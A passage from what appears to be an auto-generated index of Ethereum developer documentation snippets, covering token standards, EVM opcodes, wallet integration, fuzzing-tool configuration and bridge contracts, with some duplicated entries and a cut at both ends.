ffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b6001905092915050565b600061091c6109156109ad565b8484610bac565b6001905092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610a3b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806110736024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610ac1576040517f08c379a00000000000000000000000000000000000000000000000000000\n```\n\n----------------------------------------\n\nTITLE: Declaring ERC20 Transfer Event in Solidity\nDESCRIPTION: Defines the standard Transfer event used in ERC20 tokens to log token transfers between addresses. This event includes indexed parameters for efficient filtering.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Transfer(address indexed from, address indexed to, uint256 value);\n```\n\n----------------------------------------\n\nTITLE: CALLCODE Opcode in EVM\nDESCRIPTION: Similar to DELEGATECALL but doesn't propagate the original msg.sender and msg.value. Copies return data to specified memory location.\n\nLANGUAGE: evm assembly\nCODE:\n```\nmem[retOst:retOst+retLen-1] = returndata\n```\n\n----------------------------------------\n\nTITLE: Implementing getApproved Function for ERC-721 in Vyper\nDESCRIPTION: View function that returns the approved address for a specific token ID, throwing an error if the token ID is invalid.\n\nLANGUAGE: vyper\nCODE:\n```\n@view\n@external\ndef getApproved(_tokenId: uint256) -> address:\n    \"\"\"\n    @dev Get the approved address for a single NFT.\n         Throws if `_tokenId` is not a valid NFT.\n    @param _tokenId ID of the NFT to query the approval of.\n    \"\"\"\n    # Throws if `_tokenId` is not a valid NFT\n    assert self.idToOwner[_tokenId] != ZERO_ADDRESS\n    return self.idToApprovals[_tokenId]\n```\n\n----------------------------------------\n\nTITLE: Importing ERC20 Interface\nDESCRIPTION: Imports OpenZeppelin's ERC20 interface which provides standard functions for interacting with ERC20 tokens on L1 that need to be bridged to L2.\n\nLANGUAGE: solidity\nCODE:\n```\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n```\n\n----------------------------------------\n\nTITLE: Emitting DepositFailed Event in Ethereum L2 Gateway\nDESCRIPTION: This code snippet shows the emission of a DepositFailed event when a token deposit fails. The event includes details about the tokens, sender, recipient, amount, and additional data.\n\nLANGUAGE: solidity\nCODE:\n```\nemit DepositFailed(_l1Token, _l2Token, _from, _to, _amount, _data);\n```\n\n----------------------------------------\n\nTITLE: Implementing MetaMask Wallet Listener in React\nDESCRIPTION: Function that sets up an event listener for wallet account changes in MetaMask. Updates the UI when accounts are connected, disconnected, or switched.\n\nLANGUAGE: javascript\nCODE:\n```\nfunction addWalletListener() {\n  if (window.ethereum) {\n    window.ethereum.on(\"accountsChanged\", (accounts) => {\n      if (accounts.length > 0) {\n        setWallet(accounts[0])\n        setStatus(\"👆🏽 Write a message in the text-field above.\")\n      } else {\n        setWallet(\"\")\n        setStatus(\"🦊 Connect to MetaMask using the top right button.\")\n      }\n    })\n  } else {\n    setStatus(\n      <p>\n        {\" \"}\n        🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n          You must install MetaMask, a virtual Ethereum wallet, in your browser.\n        </a>\n      </p>\n    )\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Ethereum Keyfile Recognizer in JavaScript\nDESCRIPTION: Example demonstrating how to read and recognize different types of Ethereum keyfiles using the ethereum-keyfile-recognizer package. The code reads a keyfile, parses the JSON, and determines its format.\n\nLANGUAGE: javascript\nCODE:\n```\nvar fs = require(\"fs\")\nvar recognizer = require(\"ethereum-keyfile-recognizer\")\n\nfs.readFile(\"keyfile.json\", (err, data) => {\n  var json = JSON.parse(data)\n  var result = recognizer(json)\n})\n\n/** result\n *               [ 'web3', 3 ]   web3 (v3) keyfile\n *  [ 'ethersale', undefined ]   Ethersale keyfile\n *                        null     invalid keyfile\n */\n```\n\n----------------------------------------\n\nTITLE: Minting Liquidity Tokens in Uniswap V2 Contract (Function Signature)\nDESCRIPTION: Function signature for minting liquidity tokens when a provider adds liquidity to the reserve. This should be called from a peripheral contract that performs safety checks.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction mint(address to) external lock returns (uint liquidity) {\n```\n\n----------------------------------------\n\nTITLE: Proxy Address Retrieval in Splitter() Method\nDESCRIPTION: Continuation of the splitter() method that retrieves the proxy contract address from storage slot 3 and prepares it for return.\n\nLANGUAGE: evm-bytecode\nCODE:\n```\n10F | JUMPDEST                                          |\n110 | POP                                               |\n111 | PUSH1 0x03                                        | 0x03\n113 | SLOAD                                             | (((Storage[3] a.k.a the contract for which we are a proxy)))\n114 | PUSH1 0x40                                        | 0x40 (((Storage[3] a.k.a the contract for which we are a proxy)))\n116 | MLOAD                                             | 0x80 (((Storage[3] a.k.a the contract for which we are a proxy)))\n117 | PUSH20 0xffffffffffffffffffffffffffffffffffffffff | 0xFF...FF 0x80 (((Storage[3] a.k.a the contract for which we are a proxy)))\n12C | SWAP1                                             | 0x80 0xFF...FF (((Storage[3] a.k.a the contract for which we are a proxy)))\n12D | SWAP2                                             | (((Storage[3] a.k.a the contract for which we are a proxy))) 0xFF...FF 0x80\n12E | AND                                               | ProxyAddr 0x80\n12F | DUP2                                              | 0x80 ProxyAddr 0x80\n130 | MSTORE                                            | 0x80\n```\n\n----------------------------------------\n\nTITLE: Initializing NPM Project with Basic Configuration\nDESCRIPTION: Example of an npm initialization dialog showing the default package.json configuration for an NFT project. This sets up the basic project metadata including name, version, and description.\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"name\": \"my-nft\",\n  \"version\": \"1.0.0\",\n  \"description\": \"My first NFT!\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n  \"author\": \"\",\n  \"license\": \"ISC\"\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a Token Transfer Function in Serpent\nDESCRIPTION: A Serpent implementation of the core function for a token system on Ethereum. This function handles the transfer of tokens from one address to another after verifying the sender has sufficient balance.\n\nLANGUAGE: python\nCODE:\n```\ndef send(to, value):\n  if self.storage[msg.sender] >= value:\n    self.storage[msg.sender] = self.storage[msg.sender] - value\n    self.storage[to] = self.storage[to] + value\n```\n\n----------------------------------------\n\nTITLE: CREATE2 Opcode in EVM\nDESCRIPTION: Creates a new contract at a deterministic address calculated using a salt value. Address is determined by hashing contract parameters and the salt.\n\nLANGUAGE: evm assembly\nCODE:\n```\naddr = keccak256(0xff ++ address(this) ++ salt ++ keccak256(mem[ost:ost+len-1]))[12:]\n```\n\n----------------------------------------\n\nTITLE: Implementing a Simple Betting Game Smart Contract in Solidity\nDESCRIPTION: A basic Solidity contract that allows users to place bets. It tracks total games won and lost, emits events for placed bets, and handles payouts for winners. This serves as the example for demonstrating The Graph's querying capabilities.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity 0.7.1;\n\ncontract Game {\n    uint256 totalGamesPlayerWon = 0;\n    uint256 totalGamesPlayerLost = 0;\n    event BetPlaced(address player, uint256 value, bool hasWon);\n\n    function placeBet() external payable {\n        bool hasWon = evaluateBetForPlayer(msg.sender);\n\n        if (hasWon) {\n            (bool success, ) = msg.sender.call{ value: msg.value * 2 }('');\n            require(success, \"Transfer failed\");\n            totalGamesPlayerWon++;\n        } else {\n            totalGamesPlayerLost++;\n        }\n\n        emit BetPlaced(msg.sender, msg.value, hasWon);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a Simple Betting Game Smart Contract in Solidity\nDESCRIPTION: A basic Solidity contract that allows users to place bets. It tracks total games won and lost, emits events for placed bets, and handles payouts for winners. This serves as the example for demonstrating The Graph's querying capabilities.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity 0.7.1;\n\ncontract Game {\n    uint256 totalGamesPlayerWon = 0;\n    uint256 totalGamesPlayerLost = 0;\n    event BetPlaced(address player, uint256 value, bool hasWon);\n\n    function placeBet() external payable {\n        bool hasWon = evaluateBetForPlayer(msg.sender);\n\n        if (hasWon) {\n            (bool success, ) = msg.sender.call{ value: msg.value * 2 }('');\n            require(success, \"Transfer failed\");\n            totalGamesPlayerWon++;\n        } else {\n            totalGamesPlayerLost++;\n        }\n\n        emit BetPlaced(msg.sender, msg.value, hasWon);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Transaction Receipt with JSON-RPC\nDESCRIPTION: cURL command to get the transaction receipt after contract deployment using the eth_getTransactionReceipt JSON-RPC method. The receipt contains the contract address and other transaction details.\n\nLANGUAGE: bash\nCODE:\n```\ncurl --data '{\"jsonrpc\":\"2.0\",\"method\": \"eth_getTransactionReceipt\", \"params\": [\"0xe1f3095770633ab2b18081658bad475439f6a08c902d0915903bafff06e6febf\"], \"id\": 7}' -H \"Content-Type: application/json\" localhost:8545\n{\"jsonrpc\":\"2.0\",\"id\":7,\"result\":{\"blockHash\":\"0x77b1a4f6872b9066312de3744f60020cbd8102af68b1f6512a05b7619d527a4f\",\"blockNumber\":\"0x1\",\"contractAddress\":\"0x4d03d617d700cf81935d7f797f4e2ae719648262\",\"cumulativeGasUsed\":\"0x1c31e\",\"from\":\"0x9b1d35635cc34752ca54713bb99d38614f63c955\",\"gasUsed\":\"0x1c31e\",\"logs\":[],\"logsBloom\":\"0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\",\"status\":\"0x1\",\"to\":null,\"transactionHash\":\"0xe1f3095770633ab2b18081658bad475439f6a08c902d0915903bafff06e6febf\",\"transactionIndex\":\"0x0\"}}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Transaction Receipt with JSON-RPC\nDESCRIPTION: cURL command to get the transaction receipt after contract deployment using the eth_getTransactionReceipt JSON-RPC method. The receipt contains the contract address and other transaction details.\n\nLANGUAGE: bash\nCODE:\n```\ncurl --data '{\"jsonrpc\":\"2.0\",\"method\": \"eth_getTransactionReceipt\", \"params\": [\"0xe1f3095770633ab2b18081658bad475439f6a08c902d0915903bafff06e6febf\"], \"id\": 7}' -H \"Content-Type: application/json\" localhost:8545\n{\"jsonrpc\":\"2.0\",\"id\":7,\"result\":{\"blockHash\":\"0x77b1a4f6872b9066312de3744f60020cbd8102af68b1f6512a05b7619d527a4f\",\"blockNumber\":\"0x1\",\"contractAddress\":\"0x4d03d617d700cf81935d7f797f4e2ae719648262\",\"cumulativeGasUsed\":\"0x1c31e\",\"from\":\"0x9b1d35635cc34752ca54713bb99d38614f63c955\",\"gasUsed\":\"0x1c31e\",\"logs\":[],\"logsBloom\":\"0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\",\"status\":\"0x1\",\"to\":null,\"transactionHash\":\"0xe1f3095770633ab2b18081658bad475439f6a08c902d0915903bafff06e6febf\",\"transactionIndex\":\"0x0\"}}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Transaction Receipt with JSON-RPC\nDESCRIPTION: cURL command to get the transaction receipt after contract deployment using the eth_getTransactionReceipt JSON-RPC method. The receipt contains the contract address and other transaction details.\n\nLANGUAGE: bash\nCODE:\n```\ncurl --data '{\"jsonrpc\":\"2.0\",\"method\": \"eth_getTransactionReceipt\", \"params\": [\"0xe1f3095770633ab2b18081658bad475439f6a08c902d0915903bafff06e6febf\"], \"id\": 7}' -H \"Content-Type: application/json\" localhost:8545\n{\"jsonrpc\":\"2.0\",\"id\":7,\"result\":{\"blockHash\":\"0x77b1a4f6872b9066312de3744f60020cbd8102af68b1f6512a05b7619d527a4f\",\"blockNumber\":\"0x1\",\"contractAddress\":\"0x4d03d617d700cf81935d7f797f4e2ae719648262\",\"cumulativeGasUsed\":\"0x1c31e\",\"from\":\"0x9b1d35635cc34752ca54713bb99d38614f63c955\",\"gasUsed\":\"0x1c31e\",\"logs\":[],\"logsBloom\":\"0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\",\"status\":\"0x1\",\"to\":null,\"transactionHash\":\"0xe1f3095770633ab2b18081658bad475439f6a08c902d0915903bafff06e6febf\",\"transactionIndex\":\"0x0\"}}\n```\n\n----------------------------------------\n\nTITLE: Running Echidna with Configuration File for Function Blacklisting\nDESCRIPTION: Shows how to execute Echidna using a blacklist.yaml configuration file to filter which functions should be called during fuzzing.\n\nLANGUAGE: bash\nCODE:\n```\n$ echidna-test multi.sol --config blacklist.yaml\n...\nechidna_state4: failed!\n  Secvența de apelare:\n    f(12)\n    g(8)\n    h(42)\n    i()\n```\n\n----------------------------------------\n\nTITLE: Converting Wei to Ether Using Web3.js\nDESCRIPTION: JavaScript code using web3.js to convert a hex-encoded wei amount to ether, showing the balance in a more readable format.\n\nLANGUAGE: javascript\nCODE:\n```\nweb3.fromWei(\"0x1639e49bba16280000\", \"ether\")\n// \"410\"\n```\n\n----------------------------------------\n\nTITLE: Withdrawing Assets from ERC-4626 Vault (Solidity)\nDESCRIPTION: This function burns shares from the owner and sends exactly the specified amount of underlying assets from the vault to the receiver.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction withdraw(uint256 assets, address receiver, address owner) public returns (uint256 shares)\n```\n\n----------------------------------------\n\nTITLE: Contract Address Detection in Solidity Using Assembly\nDESCRIPTION: Internal view function that determines if an address is a contract by checking its code size using inline assembly. Returns true if the address contains code, indicating it's a contract.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction isContract(address account) internal view returns (bool) {\n    uint256 size;\n    // Currently there is no better way to check if there is a contract in an address\n    // than to check the size of the code at that address.\n    // Siehe https://ethereum.stackexchange.com/a/14016/36603\n    // für weitere Informationen zur Funktionsweise.\n    // TO-DO Verifizieren Sie dies nochmals, bevor Serenity eingeführt wird\n    //, da alle Adressen dann Contracts sein werden.\n    // solium-disable-next-line security/no-inline-assembly\n    assembly {\n        size := extcodesize(account)\n    }\n    return size > 0;\n}\n```\n\n----------------------------------------\n\nTITLE: Complete EVM Opcode Analysis of 0x1f135823 Function\nDESCRIPTION: A trace of the 0x1f135823 function which is a simple getter that reads and returns the value stored at Storage[6], also referred to as Value*.\n\nLANGUAGE: evm bytecode\nCODE:\n```\nD0 | JUMPDEST     |\nD1 | POP          |\nD2 | PUSH2 0x00da | 0xDA\nD5 | PUSH1 0x06   | 0x06 0xDA\nD7 | SLOAD        | Value* 0xDA\nD8 | DUP2         | 0xDA Value* 0xDA\nD9 | JUMP         | Value* 0xDA\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Failed Transaction in Banking System\nDESCRIPTION: An example showing a failed transaction in a traditional banking system using the state transition function. It demonstrates how the function returns an error when attempting to transfer more funds than available.\n\nLANGUAGE: javascript\nCODE:\n```\nAPPLY({ Alice: $50, Bob: $50 },\"send $70 from Alice to Bob\") = ERROR\n```\n\n----------------------------------------\n\nTITLE: Enhanced Component Initialization with Wallet Listener\nDESCRIPTION: An updated useEffect hook that includes the wallet listener initialization in addition to loading the current message and checking for connected wallets. This ensures all wallet state changes are properly tracked.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\nuseEffect(async () => {\n  const message = await loadCurrentMessage()\n  setMessage(message)\n  addSmartContractListener()\n\n  const { address, status } = await getCurrentWalletConnected()\n  setWallet(address)\n  setStatus(status)\n\n  addWalletListener()\n}, [])\n```\n\n----------------------------------------\n\nTITLE: Displaying BASEFEE in London Upgrade\nDESCRIPTION: Code reference showing the BASEFEE return from a block, introduced in EIP-3198 as part of the London upgrade. This allows contracts to access the block's base fee.\n\nLANGUAGE: markdown\nCODE:\n```\ncode>BASEFEE</code>\n```\n\n----------------------------------------\n\nTITLE: Getting Total Supply of Shares in ERC-4626 Vault\nDESCRIPTION: The totalSupply function returns the total number of unredeemed vault shares currently in circulation.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction totalSupply() public view returns (uint256)\n```\n\n----------------------------------------\n\nTITLE: Implementing Cached Write Entry Function in Solidity\nDESCRIPTION: A function that reads parameters from the cache and calls the writeEntry function. This demonstrates how to use parameter caching in a contract function.\n\nLANGUAGE: solidity\nCODE:\n```\n    function writeEntryCached() external {\n        uint[] memory params = _readParams(2);\n        writeEntry(params[0], params[1]);\n    }    // writeEntryCached\n```\n\n----------------------------------------\n\nTITLE: Code Structure Documentation in Markdown Table\nDESCRIPTION: A markdown table that outlines the repository's folder structure, providing information about the purpose and contents of each directory in the ethereum.org project.\n\nLANGUAGE: markdown\nCODE:\n```\n## Code structure\n\n| Folder                                 | Primary use                                                                                                                                                                                                                                                           |\n| -------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| `/src`                                 | Main source folder for development.                                                                                                                                                                                                                                   |\n| `/public/assets`                       | Image assets.                                                                                                                                                                                                                                                         |\n| `/src/components`                      | React components that do not function as standalone pages.                                                                                                                                                                                                            |\n| `/public/content`                      | Markdown/MDX files for site content stored here. <br>For example: `ethereum.org/en/about/` is built from `public/content/about/index.md` <br>The markdown files are parsed by `[...slug].tsx` and rendered using the proper layout in `ContentPage.getLayout` method. |\n| `/public/content/developers/docs`      | \\*Markdown files in here use the Docs layout: `src/layouts/Docs.tsx`                                                                                                                                                                                                  |\n| `/public/content/developers/tutorials` | \\*Markdown files in here use the Tutorial layout: `src/layouts/Tutorial.tsx`                                                                                                                                                                                          |\n| `/src/data`                            | General data files importable by components.                                                                                                                                                                                                                          |\n| `/src/hooks`                           | Custom React hooks.                                                                                                                                                                                                                                                   |\n| `/src/intl`                            | Language translation JSON files.                                                                                                                                                                                                                                      |\n| `/src/pages/api`                       | NextJS API Routes (https://nextjs.org/docs/pages/building-your-application/routing/api-routes)                                                                                                                                                                        |\n| `/src/pages`                           | React components that function as standalone pages.                                                                                                                                                                                                                   |\n| `/src/scripts`<br>`/src/lib/utils`     | Custom utility scripts.                                                                                                                                                                                                                                               |\n| `src/@chakra-ui`                       | Stores `theme.ts` which contains our custom Chakra theme, along with src/@chakra-ui/`semanticTokens.ts` (dark/light mode tokens) and custom Chakra components styles.                                                                                                 |\n| `src/layouts`                          | NextJS layouts (https://nextjs.org/docs/pages/building-your-application/routing/pages-and-layouts#with-typescript) that define layouts of different regions of the site.                                                                                              |\n```\n\n----------------------------------------\n\nTITLE: Initializing Hardhat Configuration\nDESCRIPTION: Command to create an empty Hardhat configuration file. This will be used to specify network settings, compiler options, and other project configurations.\n\nLANGUAGE: bash\nCODE:\n```\nnpx hardhat\n```\n\n----------------------------------------\n\nTITLE: Implementing Informational Banner with Call-to-Action for NFTs in HTML\nDESCRIPTION: HTML component that displays an informational banner about NFTs with a button link directing users to learn more about non-fungible tokens.\n\nLANGUAGE: html\nCODE:\n```\n<InfoBanner shouldSpaceBetween emoji=\":eyes:\">\n  <div>Mehr über NFTs erfahren</div>\n  <ButtonLink href=\"/nft/\">\n    Mehr zu NFTs\n  </ButtonLink>\n</InfoBanner>\n```\n\n----------------------------------------\n\nTITLE: Echidna Configuration for Corpus Collection\nDESCRIPTION: YAML configuration file that enables coverage tracking and specifies a directory for storing the corpus during fuzzing.\n\nLANGUAGE: yaml\nCODE:\n```\ncoverage: true\ncorpusDir: \"corpus-magic\"\n```\n\n----------------------------------------\n\nTITLE: Echidna Configuration for Corpus Collection\nDESCRIPTION: YAML configuration file that enables coverage tracking and specifies a directory for storing the corpus during fuzzing.\n\nLANGUAGE: yaml\nCODE:\n```\ncoverage: true\ncorpusDir: \"corpus-magic\"\n```\n\n----------------------------------------\n\nTITLE: Minting Shares in ERC-4626 Vault (Solidity)\nDESCRIPTION: This function mints exactly shares of the vault to the receiver by depositing the corresponding amount of underlying assets.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction mint(uint256 shares, address receiver) public returns (uint256 assets)\n```\n\n----------------------------------------\n\nTITLE: Executing Raw Transactions in Manticore using Python\nDESCRIPTION: Example of executing a raw transaction in Manticore with both concrete and symbolic values. When using symbolic data, Manticore will explore all functions in the contract.\n\nLANGUAGE: python\nCODE:\n```\nm.transaction(caller=user_account,\n              address=contract_account,\n              data=data,\n              value=value)\n```\n\n----------------------------------------\n\nTITLE: Calculating Daily Blocks in Ethereum Network\nDESCRIPTION: Formula that calculates the total number of Ethereum blocks generated daily, based on a 12-second block time. This calculation is essential for determining gas price requirements for deflation.\n\nLANGUAGE: markdown\nCODE:\n```\n- `(1 блок / 12 секунд) * (60 секунд/хвилина) = 5 блоків за хвилину`\n- `(5 блоків за хвилину) * (60 хвилин/година) = 300 блоків за годину`\n- `(300 блоків за годину) * (24 години / доба) = 7200 блоків за добу`\n```\n\n----------------------------------------\n\nTITLE: Installing Alchemy Web3 Package for Ethereum Connection\nDESCRIPTION: Terminal command to install the Alchemy Web3 package which provides enhanced API methods for interacting with Ethereum blockchain.\n\nLANGUAGE: text\nCODE:\n```\nnpm install @alch/alchemy-web3\n```\n\n----------------------------------------\n\nTITLE: Implementing View Functions in Vyper\nDESCRIPTION: Example of a view function in Vyper that reads but doesn't modify state. The function is decorated with @view to indicate it doesn't change state.\n\nLANGUAGE: python\nCODE:\n```\ndappName: public(string)\n\n@view\n@public\ndef readName() -> string:\n  return dappName\n```\n\n----------------------------------------\n\nTITLE: STATICCALL Opcode (FA) Memory Operations\nDESCRIPTION: The STATICCALL opcode (FA) calls another contract in read-only mode (no state modifications allowed). It stores the return data in the specified memory location.\n\nLANGUAGE: solidity\nCODE:\n```\nmem[retOst:retOst+retLen-1] := returndata\n```\n\n----------------------------------------\n\nTITLE: Retrieving Transaction Receipt from Event Data\nDESCRIPTION: Helper function to fetch the transaction receipt for a given event, providing details about the transaction that triggered the event.\n\nLANGUAGE: typescript\nCODE:\n```\nconst getEventTxn = async (ev: Event): TransactionReceipt =>\n  await client.getTransactionReceipt({ hash: ev.transactionHash })\n```\n\n----------------------------------------\n\nTITLE: Starting an IPython Session and Importing Web3.py\nDESCRIPTION: Commands to launch an IPython interactive shell and import the Web3 class from the web3.py library, which is the starting point for Ethereum development in Python.\n\nLANGUAGE: bash\nCODE:\n```\n$ ipython\n```\n\nLANGUAGE: python\nCODE:\n```\nIn [1]: from web3 import Web3\n```\n\n----------------------------------------\n\nTITLE: Initiating ETH Deposit in L1StandardBridge from L1 to L2\nDESCRIPTION: This function handles the core logic for depositing ETH from L1 to L2 by constructing a cross-domain message to L2. It creates a message to call finalizeDeposit on the L2 bridge with appropriate parameters and sends it through the cross-domain messenger.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _initiateETHDeposit(\n    address _from,\n    address _to,\n    uint32 _l2Gas,\n    bytes memory _data\n) internal {\n    // Construct calldata for finalizeDeposit call\n    bytes memory message = abi.encodeWithSelector(\n        IL2ERC20Bridge.finalizeDeposit.selector,\n        address(0),\n        Lib_PredeployAddresses.OVM_ETH,\n        _from,\n        _to,\n        msg.value,\n        _data\n    );\n    // Send calldata into L2\n    // slither-disable-next-line reentrancy-events\n    sendCrossDomainMessage(l2TokenBridge, _l2Gas, message);\n    // slither-disable-next-line reentrancy-events\n    emit ETHDepositInitiated(_from, _to, msg.value, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Using Apollo React Hooks for GraphQL Queries\nDESCRIPTION: Example of how to fetch data from a GraphQL endpoint using Apollo Client with React hooks. The code demonstrates the useQuery hook and useEffect to handle loading states and process data once it's available.\n\nLANGUAGE: javascript\nCODE:\n```\nconst { loading, error, data } = useQuery(myGraphQlQuery)\n\nReact.useEffect(() => {\n  if (!loading && !error && data) {\n    console.log({ data })\n  }\n}, [loading, error, data])\n```\n\n----------------------------------------\n\nTITLE: Creating Ethereum Contract Instance with Ethers.js\nDESCRIPTION: JavaScript code that creates a contract instance using Ethers.js. It sets up a provider connected to Alchemy, creates a signer with a private key, and instantiates the contract with its address and ABI.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\n// Provider\nconst alchemyProvider = new ethers.providers.AlchemyProvider(\n  (network = \"goerli\"),\n  API_KEY\n)\n\n// Signer\nconst signer = new ethers.Wallet(PRIVATE_KEY, alchemyProvider)\n\n// Contract\nconst helloWorldContract = new ethers.Contract(\n  CONTRACT_ADDRESS,\n  contract.abi,\n  signer\n)\n```\n\n----------------------------------------\n\nTITLE: Depositing Assets into ERC-4626 Vault (Solidity)\nDESCRIPTION: This function deposits underlying assets into the vault and grants ownership of the resulting shares to the receiver.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction deposit(uint256 assets, address receiver) public returns (uint256 shares)\n```\n\n----------------------------------------\n\nTITLE: Defining Core ERC-721 Methods in Solidity\nDESCRIPTION: The essential methods that must be implemented by any ERC-721 compliant smart contract. These functions handle token ownership, transfers, and approvals.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction balanceOf(address _owner) external view returns (uint256);\nfunction ownerOf(uint256 _tokenId) external view returns (address);\nfunction safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) external payable;\nfunction safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable;\nfunction transferFrom(address _from, address _to, uint256 _tokenId) external payable;\nfunction approve(address _approved, uint256 _tokenId) external payable;\nfunction setApprovalForAll(address _operator, bool _approved) external;\nfunction getApproved(uint256 _tokenId) external view returns (address);\nfunction isApprovedForAll(address _owner, address _operator) external view returns (bool);\n```\n\n----------------------------------------\n\nTITLE: Defining Core ERC-721 Methods in Solidity\nDESCRIPTION: The essential methods that must be implemented by any ERC-721 compliant smart contract. These functions handle token ownership, transfers, and approvals.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction balanceOf(address _owner) external view returns (uint256);\nfunction ownerOf(uint256 _tokenId) external view returns (address);\nfunction safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) external payable;\nfunction safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable;\nfunction transferFrom(address _from, address _to, uint256 _tokenId) external payable;\nfunction approve(address _approved, uint256 _tokenId) external payable;\nfunction setApprovalForAll(address _operator, bool _approved) external;\nfunction getApproved(uint256 _tokenId) external view returns (address);\nfunction isApprovedForAll(address _owner, address _operator) external view returns (bool);\n```\n\n----------------------------------------\n\nTITLE: Complete useEffect Implementation with Wallet Listener\nDESCRIPTION: Enhanced useEffect hook that not only checks for existing wallet connections but also sets up listeners for wallet state changes. This completes the wallet integration by handling both initial state and subsequent changes.\n\nLANGUAGE: javascript\nCODE:\n```\nuseEffect(async () => {\n  const { address, status } = await getCurrentWalletConnected()\n  setWallet(address)\n  setStatus(status)\n\n  addWalletListener()\n}, [])\n```\n\n----------------------------------------\n\nTITLE: Displaying Solo Staking Process Flow\nDESCRIPTION: A component that visualizes how solo staking works, showing the process flow from setup to earning rewards as a home staker.\n\nLANGUAGE: jsx\nCODE:\n```\n<StakingHowSoloWorks />\n```\n\n----------------------------------------\n\nTITLE: Withdraw Event in ERC-4626 Vault\nDESCRIPTION: The Withdraw event must be emitted when shares are withdrawn from the vault via the redeem or withdraw methods, providing information about the transaction participants and amounts.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Withdraw(\n    address indexed sender,\n    address indexed receiver,\n    address indexed owner,\n    uint256 assets,\n    uint256 shares\n)\n```\n\n----------------------------------------\n\nTITLE: Initiating ETH Deposit in L1StandardBridge from L1 to L2\nDESCRIPTION: This function handles the core logic for depositing ETH from L1 to L2 by constructing a cross-domain message to L2. It creates a message to call finalizeDeposit on the L2 bridge with appropriate parameters and sends it through the cross-domain messenger.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _initiateETHDeposit(\n    address _from,\n    address _to,\n    uint32 _l2Gas,\n    bytes memory _data\n) internal {\n    // Construct calldata for finalizeDeposit call\n    bytes memory message = abi.encodeWithSelector(\n        IL2ERC20Bridge.finalizeDeposit.selector,\n        address(0),\n        Lib_PredeployAddresses.OVM_ETH,\n        _from,\n        _to,\n        msg.value,\n        _data\n    );\n    // Send calldata into L2\n    // slither-disable-next-line reentrancy-events\n    sendCrossDomainMessage(l2TokenBridge, _l2Gas, message);\n    // slither-disable-next-line reentrancy-events\n    emit ETHDepositInitiated(_from, _to, msg.value, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Light Client Evaluation Function for Dagger-Hashimoto\nDESCRIPTION: Implementation of a light client function to compute DAG values without storing the entire graph. It uses recursion and caching to efficiently calculate any node in the DAG by computing only a small subtree of nodes.\n\nLANGUAGE: python\nCODE:\n```\ndef quick_calc(params, seed, p):\n    w, P = params[\"w\"], params[\"P\"]\n    cache = {}\n\n    def quick_calc_cached(p):\n        if p in cache:\n            pass\n        elif p == 0:\n            cache[p] = pow(sha3(seed), w, P)\n        else:\n            x = pow(sha3(seed), (p + 1) * w, P)\n            for _ in range(params[\"k\"]):\n                x ^= quick_calc_cached(x % p)\n            cache[p] = pow(x, w, P)\n        return cache[p]\n\n    return quick_calc_cached(p)\n```\n\n----------------------------------------\n\nTITLE: Testing with 